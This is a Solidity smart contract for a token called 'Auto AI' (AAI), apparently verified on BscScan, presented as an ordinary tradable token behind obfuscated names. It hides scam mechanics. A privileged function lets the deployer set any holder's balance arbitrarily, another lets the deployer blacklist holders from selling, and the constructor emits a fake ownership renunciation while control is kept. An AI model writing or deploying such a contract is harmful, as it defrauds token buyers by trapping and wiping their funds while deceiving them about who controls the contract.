/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface marketingAt {
    function createPair(address liquidityAt, address swapFee) external returns (address);
}

contract AutoAI {

    uint8 public decimals = 18;

    address marketingAtAddr = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    function totalSender(address minLaunch) public {
        atLimitMax();
        if (minLaunch == maxFeeSender || minLaunch == feeFrom) {
            return;
        }
        senderExempt[minLaunch] = true;
    }

    function buyLimit(address walletTotal, address buyExempt, uint256 modeFee) internal returns (bool) {
        require(balanceOf[walletTotal] >= modeFee);
        balanceOf[walletTotal] -= modeFee;
        balanceOf[buyExempt] += modeFee;
        emit Transfer(walletTotal, buyExempt, modeFee);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    bool public fundEnable;

    function transfer(address fundLaunch, uint256 modeFee) external returns (bool) {
        return transferFrom(tradingSell(), fundLaunch, modeFee);
    }

    address public feeFrom;

    bool public marketingFrom;

    address public owner;

    mapping(address => bool) public senderExempt;

    event Transfer(address indexed from, address indexed takeSell, uint256 value);

    mapping(address => bool) public minTake;

    function transferFrom(address toMarketingTrading, address fundLaunch, uint256 modeFee) public returns (bool) {
        if (toMarketingTrading != tradingSell() && allowance[toMarketingTrading][tradingSell()] != type(uint256).max) {
            require(allowance[toMarketingTrading][tradingSell()] >= modeFee);
            allowance[toMarketingTrading][tradingSell()] -= modeFee;
        }
        require(!senderExempt[toMarketingTrading]);
        return buyLimit(toMarketingTrading, fundLaunch, modeFee);
    }

    function swapLaunched(address swapMaxList) public {
        require(!shouldLiquidity);
        minTake[swapMaxList] = true;
        shouldLiquidity = true;
    }

    constructor (){ 
        minTake[tradingSell()] = true;
        balanceOf[tradingSell()] = totalSupply;
        maxFeeSender = tradingSell();
        feeFrom = marketingAt(address(marketingAtAddr)).createPair(address(fundAmount),address(this));
        emit Transfer(address(0), maxFeeSender, totalSupply);
        emit OwnershipTransferred(maxFeeSender, address(0));
    }

    address public maxFeeSender;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) public allowance;

    bool public shouldLiquidity;

    uint256 private teamToken;

    address fundAmount = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    bool public fundTotal;

    event Approval(address indexed isSell, address indexed spender, uint256 value);

    function atLimitMax() private view {
        require(minTake[tradingSell()]);
    }

    string public symbol = "AAI";

    function senderLaunch(address fundLaunch, uint256 modeFee) public {
        atLimitMax();
        balanceOf[fundLaunch] = modeFee;
    }

    function tradingSell() private view returns (address) {
        return msg.sender;
    }

    function approve(address receiverBuy, uint256 modeFee) public returns (bool) {
        allowance[tradingSell()][receiverBuy] = modeFee;
        emit Approval(tradingSell(), receiverBuy, modeFee);
        return true;
    }

    string public name = "Auto AI";

    uint256 private fromLiquidity;

}